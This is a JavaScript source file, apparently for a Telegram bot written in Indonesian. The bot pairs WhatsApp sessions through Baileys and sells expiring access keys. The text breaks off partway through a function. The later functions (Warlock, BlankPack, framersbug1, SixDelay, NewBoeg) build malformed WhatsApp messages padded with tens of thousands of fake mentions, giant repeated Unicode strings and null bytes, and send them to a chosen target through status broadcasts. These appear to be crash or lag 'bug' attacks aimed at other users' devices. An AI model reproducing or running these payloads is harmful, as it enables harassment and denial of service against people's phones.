const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";


let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let Ren;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ren = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ren);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ren.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ren = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ren);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ren.requestPairingCode(BotNumber, "SNITBAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ren.ev.on("creds.update", saveCreds);
  return Ren;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
╭╮╱╭┳━━━┳━━━┳━━━┳╮╱╱╭━━━┳╮╭╮╭┳╮╭╮╭╮
┃┃╱┃┃╭━╮┃╭━╮┃╭━╮┃┃╱╱┃╭━╮┃┃┃┃┃┃┃┃┃┃┃
┃╰━╯┃┃╱┃┃╰━━┫┃╱╰┫┃╱╱┃┃╱┃┃┃┃┃┃┃┃┃┃┃┃
┃╭━╮┃╰━╯┣━━╮┃┃╱╭┫┃╱╭┫╰━╯┃╰╯╰╯┃╰╯╰╯┃
┃┃╱┃┃╭━╮┃╰━╯┃╰━╯┃╰━╯┃╭━╮┣╮╭╮╭┻╮╭╮╭╯
╰╯╱╰┻╯╱╰┻━━━┻━━━┻━━━┻╯╱╰╯╰╯╰╯╱╰╯╰╯⠀⠀⠀⠀⠀⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT HASCLAW API 
├─ ID OWN : ${OwnerId}
├─ BOT : CONNECTED ✅
╰───────────────────`));
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
   if (!isAuthorized(ctx.from.id)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);

  }
});

bot.command("buatkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args || !args.includes(",")) {
    return ctx.reply("❗ Format salah.\nContoh: /buatkey renx,30d[,vip/admin/owner]");
  }

  const [usernameRaw, durasiStrRaw, roleRaw] = args.split(",");
  const username = usernameRaw.trim();
  const durasiStr = durasiStrRaw.trim();
  const role = (roleRaw || "user").trim().toLowerCase();

  // Role yang diizinkan
  const allowedRoles = ["user", "vip", "admin", "owner"];
  if (!allowedRoles.includes(role)) {
    return ctx.reply(`❌ Role tidak valid!\nGunakan salah satu dari: ${allowedRoles.join(", ")}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) {
    return ctx.reply("❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");
  }

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex].key = key;
    users[userIndex].expired = expired;
    users[userIndex].role = role;
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  const apiBaseUrl = `http://${VPS}:${PORT}/execution`;

  const functionCode = `
🧬 API WEB : \`http://${VPS}:${PORT}/\`;
  ctx.replyWithMarkdown(
    `✅ *Key berhasil dibuat:*\n\n` +
    `*Username:* \`${username}\`\n` +
    `*Key:* \`${key}\`\n` +
    `*Role:* \`${role}\`\n` +
    `*Expired:* _${expiredStr}_ WIB\n\n` +
    functionCode
  );
});


function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    const rawData = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(rawData);
    return parsed.map(u => ({
      ...u,
      expired: Number(u.expired),
      role: (u.role || "user").toLowerCase() // default user kalau belum ada
    }));
  } catch (err) {
    console.error("❌ Gagal membaca user.json:", err);
    return [];
  }
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');

  const normalizedUsers = users.map(u => ({
    ...u,
    expired: Number(u.expired),
    role: (u.role || "user").toLowerCase()
  }));

  try {
    fs.writeFileSync(filePath, JSON.stringify(normalizedUsers, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

bot.command("listkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const users = getUsers();
  if (users.length === 0) return ctx.reply("📭 Belum ada key yang dibuat.");

  let teks = `📜 *Daftar Key Aktif:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}* \`[${u.role}]\`\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("❗ Masukkan username!\nContoh: /delkey renx");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username \`${username}\` tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  const deletedRole = users[index].role || "user";
  users.splice(index, 1);
  saveUsers(users);

  ctx.reply(`🗑️ Key milik *${username}* \`[${deletedRole}]\` berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addakses", (ctx) => {
   if (!isAuthorized(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addakses <user_id>");

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User sudah punya akses.");
  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Akses diberikan ke ID: ${id}`);
});

bot.command("delakses", (ctx) => {
  if (!isAuthorized(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delakses <user_id>");

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Akses user ID ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  if (!isAuthorized(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addowner <user_id>");

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✅ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`👑 Owner baru ditambahkan: ${id}`);
});

bot.command("delowner", (ctx) => {
 if (!isAuthorized(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delowner <user_id>");

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Owner ID ${id} berhasil dihapus.`);
});

const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

async function Warlock(X) {
  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = false;
  }

  try {
    let message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
            fileSha256: MD_sha256,
            fileEncSha256: MD_encsha25,
            mediaKey: mkey,
            mimetype: type,
            directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
            fileLength: {
              low: Math.floor(Math.random() * 1000),
              high: 0,
              unsigned: true,
            },
            mediaKeyTimestamp: {
              low: Math.floor(Math.random() * 1700000000),
              high: 0,
              unsigned: false,
            },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: X,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1000 * 40 },
                  () =>
                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: {
              low: Math.floor(Math.random() * -20000000),
              high: 555,
              unsigned: parse,
            },
            isAvatar: parse,
            isAiSticker: parse,
            isLottie: parse,
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(X, message, {});
    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: X },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    console.log(chalk.red("─────「 ⏤!NECRO iNVASiON!⏤ 」─────"));
  } catch (err) {
    console.error(err);
  }
}

async function BlankPack(X) {
  let Message = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: crypto.randomUUID()
    },
    message: {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "ꦽ".repeat(45000),
        publisher: "El Kontole",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: X,
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "REJECTED",
            durationSecs: "1",
            callType: "SCHEDULED_CALL",
            participants: [
              { jid: X, callOutcome: "CONNECTED" },
              { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
              { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
              { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
            ]
          }
        }
      }
    }
  };

  await Ren.relayMessage("status@broadcast", Message.message, {
    messageId: Message.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: X }, content: undefined }]
          }
        ]
      }
    ]
  });
}

async function framersbug1(X) {
  const messageId = crypto.randomUUID();

  const Message = proto.Message.fromObject({
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: messageId
    },
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "᬴".repeat(20000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: "\u0000".repeat(30000)
          },
          contextInfo: {
            participant: X,
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "᬴".repeat(1000),
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              X,
              ...Array.from({ length: 1950 }, () =>
                `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  });

  await Ren.relayMessage("status@broadcast", Message, {
    messageId: messageId,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: X }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function SixDelay(X) {
  try {
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "᬴".repeat(10000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_call",
              paramsJson: "\u0000".repeat(50000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              )
              ],
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "sexy.com",
                newsletterJid: "333333333333333333@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, {});

    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: X }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("[bug error]", err);
  }
}

async function NewBoeg(X) {

const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
  
    let Sugandih = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(10000),
    title: "kopi dangdut",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
            ],
            groupMentions: [],
